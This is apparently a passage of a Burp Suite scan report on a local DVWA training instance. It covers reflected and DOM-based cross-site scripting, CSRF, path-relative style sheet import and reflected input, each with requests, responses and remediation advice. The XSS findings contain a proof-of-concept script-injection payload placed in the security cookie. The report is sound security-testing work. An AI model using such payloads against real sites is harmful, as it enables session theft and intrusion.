<div class="rr_div"><span>GET /dvwa/vulnerabilities/weak_id/ HTTP/1.1<br>Host: localhost:7878<br>Cookie: security=low<span class="HIGHLIGHT">sbhgr'%3e%3cscript%3ealert(1)%3c%2fscript%3en37cg</span>; PHPSESSID=uslbnhjflkcv4g9pkm7722qe1d<br>Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9<br>Upgrade-Insecure-Requests: 1<br>Referer: http://localhost:7878/dvwa/index.php<br>Accept-Encoding: gzip, deflate<br>Accept-Language: en-US,en-GB;q=0.9,en;q=0.8<br>User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.82 Safari/537.36<br>Connection: close<br>Cache-Control: max-age=0<br><br></span></div>
<h2>Response 1</h2>
<div class="rr_div"><span>HTTP/1.1 200 OK<br>Date: Fri, 11 Mar 2022 07:32:17 GMT<br>Server: Apache/2.4.52 (Win64) OpenSSL/1.1.1m PHP/8.1.2<br>X-Powered-By: PHP/8.1.2<br>Expires: Tue, 23 Jun 2009 12:00:00 GMT<br>Cache-Control: no-cache, must-revalidate<br>Pragma: no-cache<br>Set-Cookie: PHPSESSID=uslbnhjflkcv4g9pkm7722qe1d; path=/<br>Set-Cookie: security=low<br>Content-Length: 3482<br>Connection: close<br>Content-Type: text/html;charset=utf-8<br><br>&lt;!DOCTYPE html&gt;<br><br>&lt;html lang="en-GB"&gt;<br><br> &nbsp;&nbsp;&nbsp;&lt;head&gt;<br> &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp;&lt;meta http-equiv="Content-Type" content="text/html; charset=UTF-8" /&gt;<br><br> &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp;&lt;title&gt;Vulnerability: Weak Session IDs :: Damn Vulnerable Web Application (DVWA<br><b>...[SNIP]...</b><br>&lt;input type="button" value="View Help" class="popup_button" id='help_button' data-help-url='../../vulnerabilities/view_help.php?id=weak_id&amp;security=low<span class="HIGHLIGHT">sbhgr'&gt;&lt;script&gt;alert(1)&lt;/script&gt;n37cg</span>&amp;locale=en' )"&gt;<br><b>...[SNIP]...</b><br></span></div>
<div class="rule"></div>
<span class="BODH2" id="30.1.3">30.1.3.&nbsp;http://localhost:7878/dvwa/vulnerabilities/weak_id/ [security cookie]</span>
<br><a class="PREVNEXT" href="#30.1.2">Previous</a>
&nbsp;<a class="PREVNEXT" href="#31.1.1">Next</a>
<br>
<h2>Summary</h2>
<table cellpadding="0" cellspacing="0" class="summary_table">
<tr>
<td rowspan="4" class="icon" valign="top" align="center"><div class='scan_issue_medium_certain_rpt'></div></td>
<td>Severity:&nbsp;&nbsp;</td>
<td><b>Medium</b></td>
</tr>
<tr>
<td>Confidence:&nbsp;&nbsp;</td>
<td><b>Certain</b></td>
</tr>
<tr>
<td>Host:&nbsp;&nbsp;</td>
<td><b>http://localhost:7878</b></td>
</tr>
<tr>
<td>Path:&nbsp;&nbsp;</td>
<td><b>/dvwa/vulnerabilities/weak_id/</b></td>
</tr>
</table>
<h2>Issue detail</h2>
<span class="TEXT">The value of the <b>security</b> cookie is copied into the value of an HTML tag attribute which is encapsulated in single quotation marks. The payload <b>sbhgr'&gt;&lt;script&gt;alert(1)&lt;/script&gt;n37cg</b> was submitted in the security cookie. This input was echoed unmodified in the application's response.<br><br>This proof-of-concept attack demonstrates that it is possible to inject arbitrary JavaScript into the application's response.<br><br>Because the user data that is copied into the response is submitted within a cookie, the application's behavior is not trivial to exploit in an attack against another user. Typically, you will need to find a means of setting an arbitrary cookie value in the victim's browser in order to exploit the vulnerability. Applications often contain "cookie-forcing" conditions which make this possible, and such a condition in any related domain or subdomain can potentially be used for this purpose. Nonetheless, this limitation somewhat mitigates the impact of the vulnerability.</span>
<h2>Request 1</h2>
<div class="rr_div"><span>GET /dvwa/vulnerabilities/weak_id/ HTTP/1.1<br>Host: localhost:7878<br>Cookie: security=low<span class="HIGHLIGHT">sbhgr'%3e%3cscript%3ealert(1)%3c%2fscript%3en37cg</span>; PHPSESSID=uslbnhjflkcv4g9pkm7722qe1d<br>Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9<br>Upgrade-Insecure-Requests: 1<br>Referer: http://localhost:7878/dvwa/index.php<br>Accept-Encoding: gzip, deflate<br>Accept-Language: en-US,en-GB;q=0.9,en;q=0.8<br>User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.82 Safari/537.36<br>Connection: close<br>Cache-Control: max-age=0<br><br></span></div>
<h2>Response 1</h2>
<div class="rr_div"><span>HTTP/1.1 200 OK<br>Date: Fri, 11 Mar 2022 07:32:17 GMT<br>Server: Apache/2.4.52 (Win64) OpenSSL/1.1.1m PHP/8.1.2<br>X-Powered-By: PHP/8.1.2<br>Expires: Tue, 23 Jun 2009 12:00:00 GMT<br>Cache-Control: no-cache, must-revalidate<br>Pragma: no-cache<br>Set-Cookie: PHPSESSID=uslbnhjflkcv4g9pkm7722qe1d; path=/<br>Set-Cookie: security=low<br>Content-Length: 3482<br>Connection: close<br>Content-Type: text/html;charset=utf-8<br><br>&lt;!DOCTYPE html&gt;<br><br>&lt;html lang="en-GB"&gt;<br><br> &nbsp;&nbsp;&nbsp;&lt;head&gt;<br> &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp;&lt;meta http-equiv="Content-Type" content="text/html; charset=UTF-8" /&gt;<br><br> &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp;&lt;title&gt;Vulnerability: Weak Session IDs :: Damn Vulnerable Web Application (DVWA<br><b>...[SNIP]...</b><br>&lt;input type="button" value="View Help" class="popup_button" id='help_button' data-help-url='../../vulnerabilities/view_help.php?id=weak_id&amp;security=low<span class="HIGHLIGHT">sbhgr'&gt;&lt;script&gt;alert(1)&lt;/script&gt;n37cg</span>&amp;locale=en' )"&gt;<br><b>...[SNIP]...</b><br></span></div>
<div class="rule"></div>
<span class="BODH1" id="30.2">30.2.&nbsp;<a href="https://portswigger.net/knowledgebase/issues/details/00200700_crosssiterequestforgery">Cross-site request forgery</a></span>
<br><a class="PREVNEXT" href="#30.1">Previous</a>
&nbsp;<a class="PREVNEXT" href="#30.3">Next</a>
<br>
<h2>Summary</h2>
<table cellpadding="0" cellspacing="0" class="summary_table">
<tr>
<td rowspan="4" class="icon" valign="top" align="center"><div class='scan_issue_medium_tentative_rpt'></div></td>
<td>Severity:&nbsp;&nbsp;</td>
<td><b>Medium</b></td>
</tr>
<tr>
<td>Confidence:&nbsp;&nbsp;</td>
<td><b>Tentative</b></td>
</tr>
<tr>
<td>Host:&nbsp;&nbsp;</td>
<td><b>http://localhost:7878</b></td>
</tr>
<tr>
<td>Path:&nbsp;&nbsp;</td>
<td><b>/dvwa/vulnerabilities/weak_id/</b></td>
</tr>
</table>
<h2>Issue detail</h2>
<span class="TEXT">The request appears to be vulnerable to cross-site request forgery (CSRF) attacks against authenticated users.</span>
<h2>Issue background</h2>
<span class="TEXT"><p>Cross-site request forgery (CSRF) vulnerabilities may arise when applications rely solely on HTTP cookies to identify the user that has issued a particular request. Because browsers automatically add cookies to requests regardless of their origin, it may be possible for an attacker to create a malicious web site that forges a cross-domain request to the vulnerable application. For a request to be vulnerable to CSRF, the following conditions must hold:</p>
<ul>
<li>The request can be issued cross-domain, for example using an HTML form. If the request contains non-standard headers or body content, then it may only be issuable from a page that originated on the same domain.</li>
<li>The application relies solely on HTTP cookies or Basic Authentication to identify the user that issued the request. If the application places session-related tokens elsewhere within the request, then it may not be vulnerable.</li>
<li>The request performs some privileged action within the application, which modifies the application's state based on the identity of the issuing user.</li><li>The attacker can determine all the parameters required to construct a request that performs the action. If the request contains any values that the attacker cannot determine or predict, then it is not vulnerable.</li></ul></span>
<h2>Issue remediation</h2>
<span class="TEXT"><p>The most effective way to protect against CSRF vulnerabilities is to include within relevant requests an additional token that is not transmitted in a cookie: for example, a parameter in a hidden form field. This additional token should contain sufficient entropy, and be generated using a cryptographic random number generator, such that it is not feasible for an attacker to determine or predict the value of any token that was issued to another user. The token should be associated with the user's session, and the application should validate that the correct token is received before performing any action resulting from the request.</p>
<p>An alternative approach, which may be easier to implement, is to validate that Host and Referer headers in relevant requests are both present and contain the same domain name. However, this approach is somewhat less robust: historically, quirks in browsers and plugins have often enabled attackers to forge cross-domain requests that manipulate these headers to bypass such defenses. </p></span>
<h2>References</h2>
<span class="TEXT"><ul>
    <li><a href="https://portswigger.net/web-security/csrf">Web Security Academy: Cross-site request forgery</a></li>
    <li><a href="https://support.portswigger.net/customer/portal/articles/1965674-using-burp-to-test-for-cross-site-request-forgery-csrf-">Using Burp to Test for Cross-Site Request Forgery</a></li>
    <li><a href="https://media.blackhat.com/eu-13/briefings/Lundeen/bh-eu-13-deputies-still-confused-lundeen-wp.pdf">The Deputies Are Still Confused</a></li>
</ul></span>
<h2>Vulnerability classifications</h2><span class="TEXT"><ul>
<li><a href="https://cwe.mitre.org/data/definitions/352.html">CWE-352: Cross-Site Request Forgery (CSRF)</a></li>
    <li><a href="https://capec.mitre.org/data/definitions/62.html">CAPEC-62: Cross Site Request Forgery</a></li>
</ul></span>
<h2>Request 1</h2>
<div class="rr_div"><span>POST /dvwa/vulnerabilities/weak_id/ HTTP/1.1<br>Host: localhost:7878<br>Origin: http://localhost:7878<br>Cookie: security=low; PHPSESSID=7nasf77soejtfmad0mehplhve7<br>Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9<br>Upgrade-Insecure-Requests: 1<br>Referer: http://<span class="HIGHLIGHT">localhost</span>:7878/dvwa/vulnerabilities/weak_id/<br>Content-Type: application/x-www-form-urlencoded<br>Accept-Encoding: gzip, deflate<br>Accept-Language: en-US,en-GB;q=0.9,en;q=0.8<br>User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.82 Safari/537.36<br>Connection: close<br>Cache-Control: max-age=0<br>Content-Length: 0<br><br></span></div>
<h2>Response 1</h2>
<div class="rr_div"><span>HTTP/1.1 200 OK<br>Date: Fri, 11 Mar 2022 07:30:35 GMT<br>Server: Apache/2.4.52 (Win64) OpenSSL/1.1.1m PHP/8.1.2<br>X-Powered-By: PHP/8.1.2<br>Expires: Tue, 23 Jun 2009 12:00:00 GMT<br>Cache-Control: no-cache, must-revalidate<br>Pragma: no-cache<br>Set-Cookie: dvwaSession=1<br>Content-Length: 3401<br>Connection: close<br>Content-Type: text/html;charset=utf-8<br><br>&lt;!DOCTYPE html&gt;<br><br>&lt;html lang="en-GB"&gt;<br><br> &nbsp;&nbsp;&nbsp;&lt;head&gt;<br> &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp;&lt;meta http-equiv="Content-Type" content="text/html; charset=UTF-8" /&gt;<br><br> &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp;&lt;title&gt;Vulnerability: Weak Session IDs :: Damn Vulnerable Web Application (DVWA<br><b>...[SNIP]...</b><br></span></div>
<h2>Request 2</h2>
<div class="rr_div"><span>POST /dvwa/vulnerabilities/weak_id/ HTTP/1.1<br>Host: localhost:7878<br>Origin: http://localhost:7878<br>Cookie: security=low; PHPSESSID=v2kalm3j9kro1oo4cc1997e07n<br>Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9<br>Upgrade-Insecure-Requests: 1<br>Referer: http://<span class="HIGHLIGHT">rgerN.com</span>:7878/dvwa/vulnerabilities/weak_id/<br>Content-Type: application/x-www-form-urlencoded<br>Accept-Encoding: gzip, deflate<br>Accept-Language: en-US,en-GB;q=0.9,en;q=0.8<br>User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.82 Safari/537.36<br>Connection: close<br>Cache-Control: max-age=0<br>Content-Length: 0<br><br></span></div>
<h2>Response 2</h2>
<div class="rr_div"><span>HTTP/1.1 200 OK<br>Date: Fri, 11 Mar 2022 07:33:18 GMT<br>Server: Apache/2.4.52 (Win64) OpenSSL/1.1.1m PHP/8.1.2<br>X-Powered-By: PHP/8.1.2<br>Expires: Tue, 23 Jun 2009 12:00:00 GMT<br>Cache-Control: no-cache, must-revalidate<br>Pragma: no-cache<br>Set-Cookie: dvwaSession=111<br>Content-Length: 3401<br>Connection: close<br>Content-Type: text/html;charset=utf-8<br><br>&lt;!DOCTYPE html&gt;<br><br>&lt;html lang="en-GB"&gt;<br><br> &nbsp;&nbsp;&nbsp;&lt;head&gt;<br> &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp;&lt;meta http-equiv="Content-Type" content="text/html; charset=UTF-8" /&gt;<br><br> &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp;&lt;title&gt;Vulnerability: Weak Session IDs :: Damn Vulnerable Web Application (DVWA<br><b>...[SNIP]...</b><br></span></div>
<div class="rule"></div>
<span class="BODH1" id="30.3">30.3.&nbsp;<a href="https://portswigger.net/knowledgebase/issues/details/00200328_pathrelativestylesheetimport">Path-relative style sheet import</a></span>
<br><a class="PREVNEXT" href="#30.2">Previous</a>
&nbsp;<a class="PREVNEXT" href="#30.4">Next</a>
<br>
<h2>Summary</h2>
<table cellpadding="0" cellspacing="0" class="summary_table">
<tr>
<td rowspan="4" class="icon" valign="top" align="center"><div class='scan_issue_info_firm_rpt'></div></td>
<td>Severity:&nbsp;&nbsp;</td>
<td><b>Information</b></td>
</tr>
<tr>
<td>Confidence:&nbsp;&nbsp;</td>
<td><b>Firm</b></td>
</tr>
<tr>
<td>Host:&nbsp;&nbsp;</td>
<td><b>http://localhost:7878</b></td>
</tr>
<tr>
<td>Path:&nbsp;&nbsp;</td>
<td><b>/dvwa/vulnerabilities/weak_id/</b></td>
</tr>
</table>
<h2>Issue detail</h2>
<span class="TEXT">The application may be vulnerable to path-relative style sheet import (PRSSI) attacks. The first four conditions for an exploitable vulnerability are present (see issue background):<ol><li>The original response contains a path-relative style sheet import (see response 1).</li><li>When superfluous path-like data is placed into the URL following the original filename (see request 2), the application's response still contains a path-relative style sheet import (see response 2).</li><li>Response 2 can be made to render in a browser's quirks mode. Although the page contains a modern doctype directive, the response does not prevent itself from being framed. An attacker can frame the response within a page that they control, to force it to be rendered in quirks mode. (Note that this technique is IE-specific and due to P3P restrictions might sometimes limit the impact of a successful attack.)</li><li>When the path-relative style sheet import in response 2 is requested (see request 3) the application returns something other than the CSS response that was supposed to be imported (see response 3).</li></ol>It was not verified whether condition 5 holds (see issue background), and you should manually investigate whether it is possible to manipulate some text within response 3, to enable full exploitation of this issue.</span>
<h2>Issue background</h2>
<span class="TEXT"><p>Path-relative style sheet import vulnerabilities arise when the following conditions hold:</p>
<ol>
<li>A response contains a style sheet import that uses a path-relative URL (for example, the page at "/original-path/file.php" might import "styles/main.css").</li><li>When handling requests, the application or platform tolerates superfluous path-like data following the original filename in the URL (for example, "/original-path/file.php/extra-junk/"). When superfluous data is added to the original URL, the application's response still contains a path-relative stylesheet import.</li><li>The response in condition 2 can be made to render in a browser's quirks mode, either because it has a missing or old doctype directive, or because it allows itself to be framed by a page under an attacker's control.</li>
<li>When a browser requests the style sheet that is imported in the response from the modified URL (using the URL "/original-path/file.php/extra-junk/styles/main.css"), the application returns something other than the CSS response that was supposed to be imported. Given the behavior described in condition 2, this will typically be the same response that was originally returned in condition 1.</li><li>An attacker has a means of manipulating some text within the response in condition 4, for example because the application stores and displays some past input, or echoes some text within the current URL.</li></ol>
<p>Given the above conditions, an attacker can execute CSS injection within the browser of the target user. The attacker can construct a URL that causes the victim's browser to import as CSS a different URL than normal, containing text that the attacker can manipulate.</p>
<p>Being able to inject arbitrary CSS into the victim's browser may enable various attacks, including:</p>
<ul>
  <li>Executing arbitrary JavaScript using IE's expression() function.</li><li>Using CSS selectors to read parts of the HTML source, which may include sensitive data such as anti-CSRF tokens.</li>
<li>Capturing any sensitive data within the URL query string by making a further style sheet import to a URL on the attacker's domain, and monitoring the incoming Referer header.</li></ul></span>
<h2>Issue remediation</h2>
<span class="TEXT"><p>The root cause of the vulnerability can be resolved by not using path-relative URLs in style sheet imports. Aside from this, attacks can also be prevented by implementing all of the following defensive measures: </p>
<ul><li>Setting the HTTP response header "X-Frame-Options: deny" in all responses. One method that an attacker can use to make a page render in quirks mode is to frame it within their own page that is rendered in quirks mode. Setting this header prevents the page from being framed.</li><li>Setting a modern doctype (e.g. "&lt;!doctype html&gt;") in all HTML responses. This prevents the page from being rendered in quirks mode (unless it is being framed, as described above).</li>
<li>Setting the HTTP response header "X-Content-Type-Options: nosniff" in all responses. This prevents the browser from processing a non-CSS response as CSS, even if another page loads the response via a style sheet import.</li></ul></span>
<h2>References</h2>
<span class="TEXT"><ul><li><a href="https://portswigger.net/research/detecting-and-exploiting-path-relative-stylesheet-import-prssi-vulnerabilities">Detecting and exploiting path-relative stylesheet import (PRSSI) vulnerabilities</a></li></ul></span>
<h2>Vulnerability classifications</h2><span class="TEXT"><ul>
<li><a href="https://cwe.mitre.org/data/definitions/16.html">CWE-16: Configuration</a></li>
  <li><a href="https://capec.mitre.org/data/definitions/154.html">CAPEC-154: Resource Location Spoofing</a></li>
  <li><a href="https://capec.mitre.org/data/definitions/468.html">CAPEC-468: Generic Cross-Browser Cross-Domain Theft</a></li>
</ul></span>
<h2>Request 1</h2>
<div class="rr_div"><span>GET /dvwa/vulnerabilities/weak_id/ HTTP/1.1<br>Host: localhost:7878<br>Cookie: security=low; PHPSESSID=uslbnhjflkcv4g9pkm7722qe1d<br>Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9<br>Upgrade-Insecure-Requests: 1<br>Referer: http://localhost:7878/dvwa/index.php<br>Accept-Encoding: gzip, deflate<br>Accept-Language: en-US,en-GB;q=0.9,en;q=0.8<br>User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.82 Safari/537.36<br>Connection: close<br>Cache-Control: max-age=0<br><br></span></div>
<h2>Response 1</h2>
<div class="rr_div"><span>HTTP/1.1 200 OK<br>Date: Fri, 11 Mar 2022 07:29:57 GMT<br>Server: Apache/2.4.52 (Win64) OpenSSL/1.1.1m PHP/8.1.2<br>X-Powered-By: PHP/8.1.2<br>Expires: Tue, 23 Jun 2009 12:00:00 GMT<br>Cache-Control: no-cache, must-revalidate<br>Pragma: no-cache<br>Content-Length: 3401<br>Connection: close<br>Content-Type: text/html;charset=utf-8<br><br>&lt;!DOCTYPE html&gt;<br><br>&lt;html lang="en-GB"&gt;<br><br> &nbsp;&nbsp;&nbsp;&lt;head&gt;<br> &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp;&lt;meta http-equiv="Content-Type" content="text/html; charset=UTF-8" /&gt;<br><br> &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp;&lt;title&gt;Vulnerability: Weak Session IDs :: Damn Vulnerable Web Application (DVWA<br><b>...[SNIP]...</b><br>&lt;/title&gt;<br><br> &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp;<span class="HIGHLIGHT">&lt;link rel="stylesheet" type="text/css" href="../../dvwa/css/main.css" /&gt;</span><br><br> &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp;&lt;link rel="icon" type="\image/ico" href="../../favicon.ico" /&gt;<br><b>...[SNIP]...</b><br></span></div>
<h2>Request 2</h2>
<div class="rr_div"><span>GET /dvwa/vulnerabilities/weak_id/<span class="HIGHLIGHT">index.php/ozkte6/cmkg47/bi2i2u/</span> HTTP/1.1<br>Host: localhost:7878<br>Cookie: security=low; PHPSESSID=uslbnhjflkcv4g9pkm7722qe1d<br>Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9<br>Upgrade-Insecure-Requests: 1<br>Referer: http://localhost:7878/dvwa/index.php<br>Accept-Encoding: gzip, deflate<br>Accept-Language: en-US,en-GB;q=0.9,en;q=0.8<br>User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.82 Safari/537.36<br>Connection: close<br>Cache-Control: max-age=0<br><br></span></div>
<h2>Response 2</h2>
<div class="rr_div"><span>HTTP/1.1 200 OK<br>Date: Fri, 11 Mar 2022 07:32:36 GMT<br>Server: Apache/2.4.52 (Win64) OpenSSL/1.1.1m PHP/8.1.2<br>X-Powered-By: PHP/8.1.2<br>Expires: Tue, 23 Jun 2009 12:00:00 GMT<br>Cache-Control: no-cache, must-revalidate<br>Pragma: no-cache<br>Content-Length: 3401<br>Connection: close<br>Content-Type: text/html;charset=utf-8<br><br>&lt;!DOCTYPE html&gt;<br><br>&lt;html lang="en-GB"&gt;<br><br> &nbsp;&nbsp;&nbsp;&lt;head&gt;<br> &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp;&lt;meta http-equiv="Content-Type" content="text/html; charset=UTF-8" /&gt;<br><br> &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp;&lt;title&gt;Vulnerability: Weak Session IDs :: Damn Vulnerable Web Application (DVWA<br><b>...[SNIP]...</b><br>&lt;/title&gt;<br><br> &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp;<span class="HIGHLIGHT">&lt;link rel="stylesheet" type="text/css" href="../../dvwa/css/main.css" /&gt;</span><br><br> &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp;&lt;link rel="icon" type="\image/ico" href="../../favicon.ico" /&gt;<br><b>...[SNIP]...</b><br></span></div>
<h2>Request 3</h2>
<div class="rr_div"><span>GET <span class="HIGHLIGHT">/dvwa/vulnerabilities/weak_id/index.php/ozkte6/dvwa/css/main.css</span> HTTP/1.1<br>Host: localhost:7878<br>Cookie: security=low; PHPSESSID=uslbnhjflkcv4g9pkm7722qe1d<br>Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9<br>Upgrade-Insecure-Requests: 1<br>Referer: http://localhost:7878/dvwa/index.php<br>Accept-Encoding: gzip, deflate<br>Accept-Language: en-US,en-GB;q=0.9,en;q=0.8<br>User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.82 Safari/537.36<br>Connection: close<br>Cache-Control: max-age=0<br><br></span></div>
<h2>Response 3</h2>
<div class="rr_div"><span>HTTP/1.1 200 OK<br>Date: Fri, 11 Mar 2022 07:32:36 GMT<br>Server: Apache/2.4.52 (Win64) OpenSSL/1.1.1m PHP/8.1.2<br>X-Powered-By: PHP/8.1.2<br>Expires: Tue, 23 Jun 2009 12:00:00 GMT<br>Cache-Control: no-cache, must-revalidate<br>Pragma: no-cache<br>Content-Length: 3401<br>Connection: close<br>Content-Type: text/html;charset=utf-8<br><br>&lt;!DOCTYPE html&gt;<br><br>&lt;html lang="en-GB"&gt;<br><br> &nbsp;&nbsp;&nbsp;&lt;head&gt;<br> &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp;&lt;meta http-equiv="Content-Type" content="text/html; charset=UTF-8" /&gt;<br><br> &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp;&lt;title&gt;Vulnerability: Weak Session IDs :: Damn Vulnerable Web Application (DVWA<br><b>...[SNIP]...</b><br></span></div>
<div class="rule"></div>
<span class="BODH1" id="30.4">30.4.&nbsp;<a href="https://portswigger.net/knowledgebase/issues/details/00400c00_inputreturnedinresponsereflected">Input returned in response (reflected)</a></span>
<br><a class="PREVNEXT" href="#30.3">Previous</a>
&nbsp;<a class="PREVNEXT" href="#31.1">Next</a>
<br>
<h2>Summary</h2>
<table cellpadding="0" cellspacing="0" class="summary_table">
<tr>
<td rowspan="4" class="icon" valign="top" align="center"><div class='scan_issue_info_certain_rpt'></div></td>
<td>Severity:&nbsp;&nbsp;</td>
<td><b>Information</b></td>
</tr>
<tr>
<td>Confidence:&nbsp;&nbsp;</td>
<td><b>Certain</b></td>
</tr>
<tr>
<td>Host:&nbsp;&nbsp;</td>
<td><b>http://localhost:7878</b></td>
</tr>
<tr>
<td>Path:&nbsp;&nbsp;</td>
<td><b>/dvwa/vulnerabilities/weak_id/</b></td>
</tr>
</table>
<h2>Issue detail</h2>
<span class="TEXT">The value of the <b>security</b> cookie is copied into the application's response.</span>
<h2>Issue background</h2>
<span class="TEXT"><p>Reflection of input arises when data is copied from a request and echoed into the application's immediate response.</p><p>Input being returned in application responses is not a vulnerability in its own right. However, it is a prerequisite for many client-side vulnerabilities, including cross-site scripting, open redirection, content spoofing, and response header injection. Additionally, some server-side vulnerabilities such as SQL injection are often easier to identify and exploit when input is returned in responses. In applications where input retrieval is rare and the environment is resistant to automated testing (for example, due to a web application firewall), it might be worth subjecting instances of it to focused manual testing. </p></span>
<h2>Vulnerability classifications</h2><span class="TEXT"><ul>
<li><a href="https://cwe.mitre.org/data/definitions/20.html">CWE-20: Improper Input Validation</a></li>
<li><a href="https://cwe.mitre.org/data/definitions/116.html">CWE-116: Improper Encoding or Escaping of Output</a></li>
</ul></span>
<h2>Request 1</h2>
<div class="rr_div"><span>GET /dvwa/vulnerabilities/weak_id/ HTTP/1.1<br>Host: localhost:7878<br>Cookie: security=low<span class="HIGHLIGHT">158rts6yog</span>; PHPSESSID=uslbnhjflkcv4g9pkm7722qe1d<br>Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9<br>Upgrade-Insecure-Requests: 1<br>Referer: http://localhost:7878/dvwa/index.php<br>Accept-Encoding: gzip, deflate<br>Accept-Language: en-US,en-GB;q=0.9,en;q=0.8<br>User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.82 Safari/537.36<br>Connection: close<br>Cache-Control: max-age=0<br><br></span></div>
<h2>Response 1</h2>
<div class="rr_div"><span>HTTP/1.1 200 OK<br>Date: Fri, 11 Mar 2022 07:32:17 GMT<br>Server: Apache/2.4.52 (Win64) OpenSSL/1.1.1m PHP/8.1.2<br>X-Powered-By: PHP/8.1.2<br>Expires: Tue, 23 Jun 2009 12:00:00 GMT<br>Cache-Control: no-cache, must-revalidate<br>Pragma: no-cache<br>Set-Cookie: PHPSESSID=uslbnhjflkcv4g9pkm7722qe1d; path=/<br>Set-Cookie: security=low<br>Content-Length: 3428<br>Connection: close<br>Content-Type: text/html;charset=utf-8<br><br>&lt;!DOCTYPE html&gt;<br><br>&lt;html lang="en-GB"&gt;<br><br> &nbsp;&nbsp;&nbsp;&lt;head&gt;<br> &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp;&lt;meta http-equiv="Content-Type" content="text/html; charset=UTF-8" /&gt;<br><br> &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp;&lt;title&gt;Vulnerability: Weak Session IDs :: Damn Vulnerable Web Application (DVWA<br><b>...[SNIP]...</b><br>&lt;input type="button" value="View Help" class="popup_button" id='help_button' data-help-url='../../vulnerabilities/view_help.php?id=weak_id&amp;security=low<span class="HIGHLIGHT">158rts6yog</span>&amp;locale=en' )"&gt; &lt;input type="button" value="View Source" class="popup_button" id='source_button' data-source-url='../../vulnerabilities/view_source.php?id=weak_id&amp;security=low<span class="HIGHLIGHT">158rts6yog</span>' )"&gt;<br><b>...[SNIP]...</b><br></span></div>
<div class="rule"></div>
<span class="BODH0" id="31">31.&nbsp;http://localhost:7878/dvwa/vulnerabilities/xss_d/</span>
<br><a class="PREVNEXT" href="#30">Previous</a>
&nbsp;<a class="PREVNEXT" href="#32">Next</a>
<br>
<span class="BODH1" id="31.1">31.1.&nbsp;<a href="https://portswigger.net/knowledgebase/issues/details/00200310_crosssitescriptingdombased">Cross-site scripting (DOM-based)</a></span>
<br><a class="PREVNEXT" href="#30.4">Previous</a>
&nbsp;<a class="PREVNEXT" href="#31.2">Next</a>
<br>
<br><span class="TEXT">There are 2 instances of this issue:
<ul>
<li><a href="#31.1.1">/dvwa/vulnerabilities/xss_d/</a></li>
<li><a href="#31.1.2">/dvwa/vulnerabilities/xss_d/</a></li>
</ul></span>
<h2>Issue background</h2>
<span class="TEXT"><p>DOM-based vulnerabilities arise when a client-side script reads data from a controllable part of the DOM (for example, the URL) and processes this data in an unsafe way.</p>
<p>DOM-based cross-site scripting arises when a script  writes controllable data into the HTML document in an unsafe way. An attacker may be able to use the vulnerability to construct a URL that, if visited by another application user, will cause JavaScript code supplied by the attacker to execute within the user's browser in the context of that user's session with the application.</p>
<p>The attacker-supplied code can perform a wide variety of actions, such as stealing the victim's session token or login credentials, performing arbitrary actions on the victim's behalf, and logging their keystrokes.</p>
<p>Users can be induced to visit the attacker's crafted URL in various ways, similar to the usual attack delivery vectors for reflected cross-site scripting vulnerabilities.</p>

<p>Burp Suite automatically identifies this issue using static code analysis, which may lead to false positives that are not actually exploitable. The relevant code and execution paths should be reviewed to determine whether this vulnerability is indeed present, or whether mitigations are in place that would prevent exploitation.</p></span>
<h2>Issue remediation</h2>
